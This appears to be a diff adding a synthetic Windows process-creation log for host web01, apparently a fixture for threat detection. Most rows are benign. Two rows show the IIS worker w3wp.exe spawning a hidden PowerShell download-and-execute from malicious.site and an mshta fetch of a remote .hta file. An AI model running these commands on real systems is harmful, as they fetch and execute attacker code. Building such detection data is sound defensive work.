@@ -1,0 +1,11 @@
+2025-10-12T08:00:01Z,web01,svc_webapp,svchost.exe,"svchost -k netsvcs",services.exe,"services.exe",C:\Windows\System32\svchost.exe,No,1
+2025-10-12T08:01:15Z,web01,svc_webapp,chrome.exe,"chrome.exe https://intranet.local/dashboard",explorer.exe,"explorer.exe",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,1
+2025-10-12T08:02:30Z,web01,svc_webapp,taskhostw.exe,"taskhostw.exe",wininit.exe,"wininit.exe",C:\Windows\System32\taskhostw.exe,No,1
+2025-10-12T08:03:45Z,web01,svc_webapp,python.exe,"python data_cleaner.py",explorer.exe,"explorer.exe",C:\Python39\python.exe,No,1
+2025-10-12T08:04:59Z,web01,svc_webapp,code.exe,"code.exe",explorer.exe,"explorer.exe",C:\Users\svc_webapp\AppData\Local\Programs\Microsoft VS Code\Code.exe,No,1
+2025-10-12T08:05:12Z,web01,svc_webapp,powershell.exe,"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/shell.ps1')",w3wp.exe,"w3wp.exe -ap \"DefaultAppPool\"",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,No,1
+2025-10-12T08:05:15Z,web01,svc_webapp,mshta.exe,"mshta http://malicious.site/shell.hta",w3wp.exe,"w3wp.exe -ap \"DefaultAppPool\"",C:\Windows\System32\mshta.exe,No,1
+2025-10-12T08:06:00Z,web01,svc_webapp,explorer.exe,"explorer.exe",winlogon.exe,"winlogon.exe",C:\Windows\explorer.exe,No,1
+2025-10-12T08:06:30Z,web01,svc_webapp,notepad.exe,"notepad.exe",explorer.exe,"explorer.exe",C:\Windows\System32\notepad.exe,No,1
+2025-10-12T08:07:00Z,web01,svc_webapp,python.exe,"python generate_report.py",explorer.exe,"explorer.exe",C:\Python39\python.exe,No,1
+
